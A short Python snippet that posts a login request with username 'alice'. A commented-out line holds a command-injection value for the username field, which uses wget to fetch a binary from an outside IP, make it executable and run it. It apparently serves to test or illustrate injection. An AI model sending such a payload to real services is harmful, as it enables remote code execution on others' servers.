import requests
# data={"username": ";wget http://203.0.113.7/stage -O /v;chmod +x /v;/v;"}
requests.post("https://gateway.example.invalid/login", data={"username": "alice"})
